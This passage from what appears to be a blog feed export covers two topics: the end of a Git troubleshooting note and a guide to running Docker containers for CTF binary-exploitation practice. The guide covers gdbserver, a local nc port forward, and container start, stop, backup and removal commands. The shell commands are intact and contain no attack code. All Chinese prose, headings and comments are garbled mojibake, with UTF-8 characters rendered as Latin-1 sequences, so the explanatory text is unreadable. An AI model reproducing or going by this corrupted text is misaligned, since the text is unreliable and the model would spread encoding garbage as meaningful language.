<h3 id="8-â€œYour-branch-is-behind-â€˜origin-mainâ€™-by-X-commitsâ€-é”™è¯¯"><a href="#8-â€œYour-branch-is-behind-â€˜origin-mainâ€™-by-X-commitsâ€-é”™è¯¯" class="headerlink" title="8. â€œYour branch is behind â€˜origin&#x2F;mainâ€™ by X commitsâ€ é”™è¯¯"></a>8. â€œYour branch is behind â€˜origin&#x2F;mainâ€™ by X commitsâ€ é”™è¯¯</h3><ul>
<li>æ‹‰å–è¿œç¨‹æ›´æ”¹ï¼š<code>git pull origin main</code></li>
</ul>
<h3 id="9-â€œconflictâ€-é”™è¯¯"><a href="#9-â€œconflictâ€-é”™è¯¯" class="headerlink" title="9. â€œconflictâ€ é”™è¯¯"></a>9. â€œconflictâ€ é”™è¯¯</h3><ul>
<li>æ‰‹åŠ¨è§£å†³å†²çªæ–‡ä»¶</li>
<li>ä½¿ç”¨<code>git add</code>æ ‡è®°å†²çªå·²è§£å†³</li>
<li>å®Œæˆåˆå¹¶ï¼š<code>git commit</code></li>
</ul>
<h3 id="10-â€œuntracked-filesâ€-é—®é¢˜"><a href="#10-â€œuntracked-filesâ€-é—®é¢˜" class="headerlink" title="10. â€œuntracked filesâ€ é—®é¢˜"></a>10. â€œuntracked filesâ€ é—®é¢˜</h3><ul>
<li>æ·»åŠ æœªè·Ÿè¸ªæ–‡ä»¶ï¼š<code>git add .</code></li>
<li>æˆ–å¿½ç•¥æ–‡ä»¶ï¼šåœ¨.gitignoreä¸­æ·»åŠ æ–‡ä»¶æ¨¡å¼</li>
</ul>
<hr>
]]></content>
      <categories>
        <category>çŸ¥è¯†æ‚ç¢</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwnä¸“å±Dockerç¯å¢ƒé…ç½®ä¸æ“ä½œ</title>
    <url>/2025/12/02/Pwn%E4%B8%93%E5%B1%9EDocker%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="ä¸€ã€ç¯å¢ƒå‰ç½®å‡†å¤‡"><a href="#ä¸€ã€ç¯å¢ƒå‰ç½®å‡†å¤‡" class="headerlink" title="ä¸€ã€ç¯å¢ƒå‰ç½®å‡†å¤‡"></a>ä¸€ã€ç¯å¢ƒå‰ç½®å‡†å¤‡</h2><h3 id="1-éªŒè¯ç°æœ‰Ubuntué•œåƒ"><a href="#1-éªŒè¯ç°æœ‰Ubuntué•œåƒ" class="headerlink" title="1. éªŒè¯ç°æœ‰Ubuntué•œåƒ"></a>1. éªŒè¯ç°æœ‰Ubuntué•œåƒ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<ul>
<li>é¢„æœŸç»“æœï¼šéœ€åŒ…å« <code>ubuntu:16.04</code>ã€<code>ubuntu:18.04</code>ã€<code>ubuntu:20.04</code> ä¸‰ä¸ªé•œåƒ</li>
</ul>
<h3 id="2-æ‹‰å–ç¼ºå¤±é•œåƒï¼ˆè‹¥éªŒè¯ä¸é€šè¿‡ï¼‰"><a href="#2-æ‹‰å–ç¼ºå¤±é•œåƒï¼ˆè‹¥éªŒè¯ä¸é€šè¿‡ï¼‰" class="headerlink" title="2. æ‹‰å–ç¼ºå¤±é•œåƒï¼ˆè‹¥éªŒè¯ä¸é€šè¿‡ï¼‰"></a>2. æ‹‰å–ç¼ºå¤±é•œåƒï¼ˆè‹¥éªŒè¯ä¸é€šè¿‡ï¼‰</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Ubuntu 16.04ï¼ˆå¯¹åº”libc-2.23ï¼Œç«¯å£9997ï¼‰</span></span><br><span class="line">docker pull ubuntu:16.04</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu 18.04ï¼ˆå¯¹åº”libc-2.27ï¼Œç«¯å£9998ï¼‰</span></span><br><span class="line">docker pull ubuntu:18.04</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu 20.04ï¼ˆå¯¹åº”libc-2.31ï¼Œç«¯å£9999ï¼‰</span></span><br><span class="line">docker pull ubuntu:20.04</span><br></pre></td></tr></table></figure>

<h2 id="äºŒã€æ ¸å¿ƒå®¹å™¨åˆ›å»ºï¼ˆ3ä¸ªPwnä¸“ç”¨ç¯å¢ƒï¼‰"><a href="#äºŒã€æ ¸å¿ƒå®¹å™¨åˆ›å»ºï¼ˆ3ä¸ªPwnä¸“ç”¨ç¯å¢ƒï¼‰" class="headerlink" title="äºŒã€æ ¸å¿ƒå®¹å™¨åˆ›å»ºï¼ˆ3ä¸ªPwnä¸“ç”¨ç¯å¢ƒï¼‰"></a>äºŒã€æ ¸å¿ƒå®¹å™¨åˆ›å»ºï¼ˆ3ä¸ªPwnä¸“ç”¨ç¯å¢ƒï¼‰</h2><h3 id="å®¹å™¨1ï¼šUbuntu-16-04-libc-2-23"><a href="#å®¹å™¨1ï¼šUbuntu-16-04-libc-2-23" class="headerlink" title="å®¹å™¨1ï¼šUbuntu 16.04 + libc-2.23"></a>å®¹å™¨1ï¼šUbuntu 16.04 + libc-2.23</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --privileged \</span><br><span class="line">  -v ~/Pwn/myPwn:/root/myPwn \  <span class="comment"># æœ¬åœ°ä»“åº“æŒ‚è½½åˆ°å®¹å™¨</span></span><br><span class="line">  -p 9997:9997 \                                  <span class="comment"># ç«¯å£æ˜ å°„ï¼ˆä¸»æœº:å®¹å™¨ï¼‰</span></span><br><span class="line">  --name pwn-2.23 \                               <span class="comment"># å®¹å™¨åç§°</span></span><br><span class="line">  ubuntu:16.04 /bin/bash</span><br></pre></td></tr></table></figure>
<p>å®¹å™¨å†…é¦–æ¬¡å¯åŠ¨éœ€æ‰§è¡Œï¼ˆå®‰è£…è°ƒè¯•å·¥å…·ï¼‰ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install -y gdbserver net-tools git</span><br></pre></td></tr></table></figure>

<h3 id="å®¹å™¨2ï¼šUbuntu-18-04-libc-2-27"><a href="#å®¹å™¨2ï¼šUbuntu-18-04-libc-2-27" class="headerlink" title="å®¹å™¨2ï¼šUbuntu 18.04 + libc-2.27"></a>å®¹å™¨2ï¼šUbuntu 18.04 + libc-2.27</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --privileged \</span><br><span class="line">  -v ~/Pwn/myPwn:/root/myPwn \</span><br><span class="line">  -p 9998:9998 \</span><br><span class="line">  --name pwn-2.27 \</span><br><span class="line">  ubuntu:18.04 /bin/bash</span><br></pre></td></tr></table></figure>
<p>å®¹å™¨å†…é¦–æ¬¡å¯åŠ¨éœ€æ‰§è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install -y gdbserver net-tools git</span><br></pre></td></tr></table></figure>

<h3 id="å®¹å™¨3ï¼šUbuntu-20-04-libc-2-31"><a href="#å®¹å™¨3ï¼šUbuntu-20-04-libc-2-31" class="headerlink" title="å®¹å™¨3ï¼šUbuntu 20.04 + libc-2.31"></a>å®¹å™¨3ï¼šUbuntu 20.04 + libc-2.31</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --privileged \</span><br><span class="line">  -v ~/Pwn/myPwn:/root/myPwn \</span><br><span class="line">  -p 9999:9999 \</span><br><span class="line">  --name pwn-2.31 \</span><br><span class="line">  ubuntu:20.04 /bin/bash</span><br></pre></td></tr></table></figure>
<p>å®¹å™¨å†…é¦–æ¬¡å¯åŠ¨éœ€æ‰§è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install -y gdbserver net-tools git</span><br></pre></td></tr></table></figure>

<h2 id="ä¸‰ã€å®¹å™¨æ—¥å¸¸ç®¡ç†æŒ‡ä»¤"><a href="#ä¸‰ã€å®¹å™¨æ—¥å¸¸ç®¡ç†æŒ‡ä»¤" class="headerlink" title="ä¸‰ã€å®¹å™¨æ—¥å¸¸ç®¡ç†æŒ‡ä»¤"></a>ä¸‰ã€å®¹å™¨æ—¥å¸¸ç®¡ç†æŒ‡ä»¤</h2><h3 id="1-å¯åŠ¨å®¹å™¨"><a href="#1-å¯åŠ¨å®¹å™¨" class="headerlink" title="1. å¯åŠ¨å®¹å™¨"></a>1. å¯åŠ¨å®¹å™¨</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¯åŠ¨å•ä¸ªå®¹å™¨ï¼ˆç¤ºä¾‹ï¼špwn-2.27ï¼‰</span></span><br><span class="line">docker start pwn-2.27</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨æ‰€æœ‰Pwnå®¹å™¨ï¼ˆä¸€é”®æ“ä½œï¼‰</span></span><br><span class="line">docker start pwn-2.23 pwn-2.27 pwn-2.31</span><br></pre></td></tr></table></figure>

<h3 id="2-è¿›å…¥å·²å¯åŠ¨çš„å®¹å™¨"><a href="#2-è¿›å…¥å·²å¯åŠ¨çš„å®¹å™¨" class="headerlink" title="2. è¿›å…¥å·²å¯åŠ¨çš„å®¹å™¨"></a>2. è¿›å…¥å·²å¯åŠ¨çš„å®¹å™¨</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¿›å…¥å•ä¸ªå®¹å™¨ï¼ˆç¤ºä¾‹ï¼špwn-2.27ï¼‰</span></span><br><span class="line">docker <span class="built_in">exec</span> -it pwn-2.27 /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿›å…¥å…¶ä»–å®¹å™¨</span></span><br><span class="line">docker <span class="built_in">exec</span> -it pwn-2.23 /bin/bash  <span class="comment"># 16.04ç¯å¢ƒ</span></span><br><span class="line">docker <span class="built_in">exec</span> -it pwn-2.31 /bin/bash  <span class="comment"># 20.04ç¯å¢ƒ</span></span><br></pre></td></tr></table></figure>

<h3 id="3-åœæ­¢å®¹å™¨"><a href="#3-åœæ­¢å®¹å™¨" class="headerlink" title="3. åœæ­¢å®¹å™¨"></a>3. åœæ­¢å®¹å™¨</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åœæ­¢å•ä¸ªå®¹å™¨ï¼ˆç¤ºä¾‹ï¼špwn-2.27ï¼‰</span></span><br><span class="line">docker stop pwn-2.27</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœæ­¢æ‰€æœ‰Pwnå®¹å™¨</span></span><br><span class="line">docker stop pwn-2.23 pwn-2.27 pwn-2.31</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœæ­¢æ‰€æœ‰è¿è¡Œä¸­çš„å®¹å™¨ï¼ˆå¿«é€Ÿæ¸…ç†ï¼‰</span></span><br><span class="line">docker stop $(docker ps -q)</span><br></pre></td></tr></table></figure>

<h3 id="4-æŸ¥çœ‹å®¹å™¨çŠ¶æ€"><a href="#4-æŸ¥çœ‹å®¹å™¨çŠ¶æ€" class="headerlink" title="4. æŸ¥çœ‹å®¹å™¨çŠ¶æ€"></a>4. æŸ¥çœ‹å®¹å™¨çŠ¶æ€</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹è¿è¡Œä¸­çš„å®¹å™¨</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ï¼ˆè¿è¡Œä¸­+å·²åœæ­¢ï¼‰</span></span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<h3 id="5-é‡å¯å®¹å™¨ï¼ˆè§£å†³å¡æ­»æˆ–é…ç½®ç”Ÿæ•ˆï¼‰"><a href="#5-é‡å¯å®¹å™¨ï¼ˆè§£å†³å¡æ­»æˆ–é…ç½®ç”Ÿæ•ˆï¼‰" class="headerlink" title="5. é‡å¯å®¹å™¨ï¼ˆè§£å†³å¡æ­»æˆ–é…ç½®ç”Ÿæ•ˆï¼‰"></a>5. é‡å¯å®¹å™¨ï¼ˆè§£å†³å¡æ­»æˆ–é…ç½®ç”Ÿæ•ˆï¼‰</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç¤ºä¾‹ï¼šé‡å¯pwn-2.27</span></span><br><span class="line">docker restart pwn-2.27</span><br></pre></td></tr></table></figure>

<h2 id="å››ã€Pwnè°ƒè¯•æ ¸å¿ƒæ“ä½œ"><a href="#å››ã€Pwnè°ƒè¯•æ ¸å¿ƒæ“ä½œ" class="headerlink" title="å››ã€Pwnè°ƒè¯•æ ¸å¿ƒæ“ä½œ"></a>å››ã€Pwnè°ƒè¯•æ ¸å¿ƒæ“ä½œ</h2><h3 id="1-å•æ­¥è°ƒè¯•æ¨¡å¼ï¼ˆæ¨èï¼‰"><a href="#1-å•æ­¥è°ƒè¯•æ¨¡å¼ï¼ˆæ¨èï¼‰" class="headerlink" title="1. å•æ­¥è°ƒè¯•æ¨¡å¼ï¼ˆæ¨èï¼‰"></a>1. å•æ­¥è°ƒè¯•æ¨¡å¼ï¼ˆæ¨èï¼‰</h3><p>è¿›å…¥å¯¹åº”å®¹å™¨åï¼Œæ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼ˆæ›¿æ¢é¢˜ç›®è·¯å¾„&#x2F;æ–‡ä»¶åï¼‰ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¿›å…¥é¢˜ç›®ç›®å½•ï¼ˆç¤ºä¾‹ï¼‰</span></span><br><span class="line"><span class="built_in">cd</span> /root/myPwn/babyheap-2.27</span><br><span class="line"></span><br><span class="line"><span class="comment"># èµ‹äºˆæ‰§è¡Œæƒé™</span></span><br><span class="line"><span class="built_in">chmod</span> +x ./babyheap</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨gdbserverï¼ˆç­‰å¾…ä¸»æœºè¿æ¥ï¼‰</span></span><br><span class="line">gdbserver 0.0.0.0:9998 ./babyheap</span><br></pre></td></tr></table></figure>
<ul>
<li>æˆåŠŸæ ‡å¿—ï¼šå®¹å™¨å†…æ˜¾ç¤º <code>Listening on port 9998</code></li>
</ul>
<h3 id="2-å¿«é€Ÿæµ‹è¯•æ¨¡å¼ï¼ˆæ— éœ€å•æ­¥è°ƒè¯•ï¼‰"><a href="#2-å¿«é€Ÿæµ‹è¯•æ¨¡å¼ï¼ˆæ— éœ€å•æ­¥è°ƒè¯•ï¼‰" class="headerlink" title="2. å¿«é€Ÿæµ‹è¯•æ¨¡å¼ï¼ˆæ— éœ€å•æ­¥è°ƒè¯•ï¼‰"></a>2. å¿«é€Ÿæµ‹è¯•æ¨¡å¼ï¼ˆæ— éœ€å•æ­¥è°ƒè¯•ï¼‰</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/myPwn/é¢˜ç›®æ–‡ä»¶å¤¹å</span><br><span class="line"><span class="built_in">chmod</span> +x ./é¢˜ç›®æ–‡ä»¶å</span><br><span class="line">./é¢˜ç›®æ–‡ä»¶å | nc -l 0.0.0.0 9998  <span class="comment"># ç”¨ncè½¬å‘ç«¯å£</span></span><br></pre></td></tr></table></figure>

<h3 id="3-éªŒè¯ç«¯å£ç›‘å¬çŠ¶æ€ï¼ˆæ’æŸ¥è¿æ¥é—®é¢˜ï¼‰"><a href="#3-éªŒè¯ç«¯å£ç›‘å¬çŠ¶æ€ï¼ˆæ’æŸ¥è¿æ¥é—®é¢˜ï¼‰" class="headerlink" title="3. éªŒè¯ç«¯å£ç›‘å¬çŠ¶æ€ï¼ˆæ’æŸ¥è¿æ¥é—®é¢˜ï¼‰"></a>3. éªŒè¯ç«¯å£ç›‘å¬çŠ¶æ€ï¼ˆæ’æŸ¥è¿æ¥é—®é¢˜ï¼‰</h3><p>å®¹å™¨å†…æ‰§è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -tuln</span><br></pre></td></tr></table></figure>
<ul>
<li>é¢„æœŸç»“æœï¼šè°ƒè¯•æ—¶å¯¹åº”ç«¯å£ï¼ˆ9997&#x2F;9998&#x2F;9999ï¼‰æ˜¾ç¤ºä¸º <code>LISTEN</code> çŠ¶æ€</li>
</ul>
<h3 id="4-ä¸»æœºä¸å®¹å™¨æ–‡ä»¶äº’ä¼ ï¼ˆåº”æ€¥ç”¨ï¼‰"><a href="#4-ä¸»æœºä¸å®¹å™¨æ–‡ä»¶äº’ä¼ ï¼ˆåº”æ€¥ç”¨ï¼‰" class="headerlink" title="4. ä¸»æœºä¸å®¹å™¨æ–‡ä»¶äº’ä¼ ï¼ˆåº”æ€¥ç”¨ï¼‰"></a>4. ä¸»æœºä¸å®¹å™¨æ–‡ä»¶äº’ä¼ ï¼ˆåº”æ€¥ç”¨ï¼‰</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸»æœº â†’ å®¹å™¨ï¼ˆç¤ºä¾‹ï¼šä¼ exp.pyåˆ°pwn-2.27ï¼‰</span></span><br><span class="line">docker <span class="built_in">cp</span> ~/Pwn/myPwn/exp.py pwn-2.27:/root/myPwn/</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®¹å™¨ â†’ ä¸»æœºï¼ˆç¤ºä¾‹ï¼šä¼ flag.txtåˆ°æœ¬åœ°ï¼‰</span></span><br><span class="line">docker <span class="built_in">cp</span> pwn-2.27:/root/myPwn/flag.txt ~/Pwn/</span><br></pre></td></tr></table></figure>

<h2 id="äº”ã€å®¹å™¨é€€å‡ºæ–¹å¼"><a href="#äº”ã€å®¹å™¨é€€å‡ºæ–¹å¼" class="headerlink" title="äº”ã€å®¹å™¨é€€å‡ºæ–¹å¼"></a>äº”ã€å®¹å™¨é€€å‡ºæ–¹å¼</h2><h3 id="1-é€€å‡ºååœæ­¢å®¹å™¨ï¼ˆè°ƒè¯•å®Œæˆï¼‰"><a href="#1-é€€å‡ºååœæ­¢å®¹å™¨ï¼ˆè°ƒè¯•å®Œæˆï¼‰" class="headerlink" title="1. é€€å‡ºååœæ­¢å®¹å™¨ï¼ˆè°ƒè¯•å®Œæˆï¼‰"></a>1. é€€å‡ºååœæ­¢å®¹å™¨ï¼ˆè°ƒè¯•å®Œæˆï¼‰</h3><p>å®¹å™¨å†…è¾“å…¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<ul>
<li>æ•ˆæœï¼šè¿”å›ä¸»æœºç»ˆç«¯ï¼Œå®¹å™¨çŠ¶æ€å˜ä¸º <code>Exited</code></li>
</ul>
<h3 id="2-é€€å‡ºåä¿ç•™è¿è¡Œï¼ˆæš‚æ—¶ç¦»å¼€ï¼‰"><a href="#2-é€€å‡ºåä¿ç•™è¿è¡Œï¼ˆæš‚æ—¶ç¦»å¼€ï¼‰" class="headerlink" title="2. é€€å‡ºåä¿ç•™è¿è¡Œï¼ˆæš‚æ—¶ç¦»å¼€ï¼‰"></a>2. é€€å‡ºåä¿ç•™è¿è¡Œï¼ˆæš‚æ—¶ç¦»å¼€ï¼‰</h3><p>å®¹å™¨å†…æŒ‰ç»„åˆé”®ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ctrl + P + Q  <span class="comment"># å…ˆæŒ‰Ctrl+Pï¼Œå†æŒ‰Ctrl+Qï¼ˆé¡ºåºä¸å¯æ¢ï¼‰</span></span><br></pre></td></tr></table></figure>
<ul>
<li>æ•ˆæœï¼šè¿”å›ä¸»æœºç»ˆç«¯ï¼Œå®¹å™¨ä»åœ¨åå°è¿è¡Œï¼ˆçŠ¶æ€ä¸º <code>Up</code>ï¼‰</li>
</ul>
<h2 id="å…­ã€é•œåƒç®¡ç†ï¼ˆå¤‡ä»½-æ¢å¤ï¼‰"><a href="#å…­ã€é•œåƒç®¡ç†ï¼ˆå¤‡ä»½-æ¢å¤ï¼‰" class="headerlink" title="å…­ã€é•œåƒç®¡ç†ï¼ˆå¤‡ä»½&#x2F;æ¢å¤ï¼‰"></a>å…­ã€é•œåƒç®¡ç†ï¼ˆå¤‡ä»½&#x2F;æ¢å¤ï¼‰</h2><h3 id="1-æŸ¥çœ‹æœ¬åœ°é•œåƒ"><a href="#1-æŸ¥çœ‹æœ¬åœ°é•œåƒ" class="headerlink" title="1. æŸ¥çœ‹æœ¬åœ°é•œåƒ"></a>1. æŸ¥çœ‹æœ¬åœ°é•œåƒ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<h3 id="2-å¤‡ä»½é•œåƒï¼ˆæ¢è®¾å¤‡-é‡è£…ç³»ç»Ÿï¼‰"><a href="#2-å¤‡ä»½é•œåƒï¼ˆæ¢è®¾å¤‡-é‡è£…ç³»ç»Ÿï¼‰" class="headerlink" title="2. å¤‡ä»½é•œåƒï¼ˆæ¢è®¾å¤‡&#x2F;é‡è£…ç³»ç»Ÿï¼‰"></a>2. å¤‡ä»½é•œåƒï¼ˆæ¢è®¾å¤‡&#x2F;é‡è£…ç³»ç»Ÿï¼‰</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºå¤‡ä»½ç›®å½•</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/docker-backup</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤‡ä»½å•ä¸ªé•œåƒï¼ˆç¤ºä¾‹ï¼šubuntu:18.04ï¼‰</span></span><br><span class="line">docker save -o ~/docker-backup/ubuntu18.04-pwn.tar ubuntu:18.04</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤‡ä»½æ‰€æœ‰PwnåŸºç¡€é•œåƒ</span></span><br><span class="line">docker save -o ~/docker-backup/ubuntu-all-pwn.tar ubuntu:16.04 ubuntu:18.04 ubuntu:20.04</span><br></pre></td></tr></table></figure>

<h3 id="3-æ¢å¤å¤‡ä»½çš„é•œåƒ"><a href="#3-æ¢å¤å¤‡ä»½çš„é•œåƒ" class="headerlink" title="3. æ¢å¤å¤‡ä»½çš„é•œåƒ"></a>3. æ¢å¤å¤‡ä»½çš„é•œåƒ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ¢å¤å•ä¸ªé•œåƒï¼ˆç¤ºä¾‹ï¼šubuntu:18.04ï¼‰</span></span><br><span class="line">docker load -i ~/docker-backup/ubuntu18.04-pwn.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¢å¤æ‰€æœ‰é•œåƒ</span></span><br><span class="line">docker load -i ~/docker-backup/ubuntu-all-pwn.tar</span><br></pre></td></tr></table></figure>

<h3 id="4-åˆ é™¤é•œåƒï¼ˆè°¨æ…æ“ä½œï¼‰"><a href="#4-åˆ é™¤é•œåƒï¼ˆè°¨æ…æ“ä½œï¼‰" class="headerlink" title="4. åˆ é™¤é•œåƒï¼ˆè°¨æ…æ“ä½œï¼‰"></a>4. åˆ é™¤é•œåƒï¼ˆè°¨æ…æ“ä½œï¼‰</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å…ˆåˆ é™¤ä¾èµ–å®¹å™¨ï¼Œå†åˆ é™¤é•œåƒï¼ˆç¤ºä¾‹ï¼šubuntu:16.04ï¼‰</span></span><br><span class="line">docker stop pwn-2.23 &amp;&amp; docker <span class="built_in">rm</span> pwn-2.23</span><br><span class="line">docker rmi ubuntu:16.04</span><br></pre></td></tr></table></figure>

<h2 id="ä¸ƒã€å®¹å™¨åˆ é™¤ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰"><a href="#ä¸ƒã€å®¹å™¨åˆ é™¤ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰" class="headerlink" title="ä¸ƒã€å®¹å™¨åˆ é™¤ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰"></a>ä¸ƒã€å®¹å™¨åˆ é™¤ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰</h2><h3 id="1-åˆ é™¤å•ä¸ªå®¹å™¨"><a href="#1-åˆ é™¤å•ä¸ªå®¹å™¨" class="headerlink" title="1. åˆ é™¤å•ä¸ªå®¹å™¨"></a>1. åˆ é™¤å•ä¸ªå®¹å™¨</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å…ˆåœæ­¢ï¼Œå†åˆ é™¤ï¼ˆç¤ºä¾‹ï¼špwn-2.23ï¼‰</span></span><br><span class="line">docker stop pwn-2.23 &amp;&amp; docker <span class="built_in">rm</span> pwn-2.23</span><br></pre></td></tr></table></figure>

<h3 id="2-æ¸…ç†æ‰€æœ‰å·²åœæ­¢çš„å®¹å™¨"><a href="#2-æ¸…ç†æ‰€æœ‰å·²åœæ­¢çš„å®¹å™¨" class="headerlink" title="2. æ¸…ç†æ‰€æœ‰å·²åœæ­¢çš„å®¹å™¨"></a>2. æ¸…ç†æ‰€æœ‰å·²åœæ­¢çš„å®¹å™¨</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q)</span><br></pre></td></tr></table></figure>

<h3 id="3-å¼ºåˆ¶åˆ é™¤è¿è¡Œä¸­çš„å®¹å™¨ï¼ˆä¸æ¨èï¼‰"><a href="#3-å¼ºåˆ¶åˆ é™¤è¿è¡Œä¸­çš„å®¹å™¨ï¼ˆä¸æ¨èï¼‰" class="headerlink" title="3. å¼ºåˆ¶åˆ é™¤è¿è¡Œä¸­çš„å®¹å™¨ï¼ˆä¸æ¨èï¼‰"></a>3. å¼ºåˆ¶åˆ é™¤è¿è¡Œä¸­çš„å®¹å™¨ï¼ˆä¸æ¨èï¼‰</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> -f pwn-2.23</span><br></pre></td></tr></table></figure>

<h2 id="å…«ã€é—®é¢˜æ’æŸ¥æŒ‡ä»¤"><a href="#å…«ã€é—®é¢˜æ’æŸ¥æŒ‡ä»¤" class="headerlink" title="å…«ã€é—®é¢˜æ’æŸ¥æŒ‡ä»¤"></a>å…«ã€é—®é¢˜æ’æŸ¥æŒ‡ä»¤</h2><h3 id="1-æŸ¥çœ‹å®¹å™¨è¯¦ç»†é…ç½®ï¼ˆIP-æŒ‚è½½-ç«¯å£ï¼‰"><a href="#1-æŸ¥çœ‹å®¹å™¨è¯¦ç»†é…ç½®ï¼ˆIP-æŒ‚è½½-ç«¯å£ï¼‰" class="headerlink" title="1. æŸ¥çœ‹å®¹å™¨è¯¦ç»†é…ç½®ï¼ˆIP&#x2F;æŒ‚è½½&#x2F;ç«¯å£ï¼‰"></a>1. æŸ¥çœ‹å®¹å™¨è¯¦ç»†é…ç½®ï¼ˆIP&#x2F;æŒ‚è½½&#x2F;ç«¯å£ï¼‰</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹pwn-2.27è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line">docker inspect pwn-2.27</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¿«é€Ÿè·å–å®¹å™¨IP</span></span><br><span class="line">docker inspect pwn-2.27 | grep <span class="string">&quot;IPAddress&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-æŸ¥çœ‹å®¹å™¨è¿è¡Œæ—¥å¿—ï¼ˆé¢˜ç›®å´©æºƒ-æŠ¥é”™æ—¶ï¼‰"><a href="#2-æŸ¥çœ‹å®¹å™¨è¿è¡Œæ—¥å¿—ï¼ˆé¢˜ç›®å´©æºƒ-æŠ¥é”™æ—¶ï¼‰" class="headerlink" title="2. æŸ¥çœ‹å®¹å™¨è¿è¡Œæ—¥å¿—ï¼ˆé¢˜ç›®å´©æºƒ&#x2F;æŠ¥é”™æ—¶ï¼‰"></a>2. æŸ¥çœ‹å®¹å™¨è¿è¡Œæ—¥å¿—ï¼ˆé¢˜ç›®å´©æºƒ&#x2F;æŠ¥é”™æ—¶ï¼‰</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹pwn-2.27æ—¥å¿—</span></span><br><span class="line">docker logs pwn-2.27</span><br></pre></td></tr></table></figure>

<h3 id="3-æ£€æŸ¥ç«¯å£æ˜ å°„æ˜¯å¦ç”Ÿæ•ˆ"><a href="#3-æ£€æŸ¥ç«¯å£æ˜ å°„æ˜¯å¦ç”Ÿæ•ˆ" class="headerlink" title="3. æ£€æŸ¥ç«¯å£æ˜ å°„æ˜¯å¦ç”Ÿæ•ˆ"></a>3. æ£€æŸ¥ç«¯å£æ˜ å°„æ˜¯å¦ç”Ÿæ•ˆ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ç«¯å£æ˜ å°„</span></span><br><span class="line">docker port $(docker ps -q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å•ä¸ªå®¹å™¨æ˜ å°„ï¼ˆç¤ºä¾‹ï¼špwn-2.27ï¼‰</span></span><br><span class="line">docker port pwn-2.27</span><br></pre></td></tr></table></figure>

<h2 id="ä¹ã€å¿«æ·æŒ‡ä»¤ï¼ˆä¸€é”®å¤ç”¨ï¼‰"><a href="#ä¹ã€å¿«æ·æŒ‡ä»¤ï¼ˆä¸€é”®å¤ç”¨ï¼‰" class="headerlink" title="ä¹ã€å¿«æ·æŒ‡ä»¤ï¼ˆä¸€é”®å¤ç”¨ï¼‰"></a>ä¹ã€å¿«æ·æŒ‡ä»¤ï¼ˆä¸€é”®å¤ç”¨ï¼‰</h2><ol>
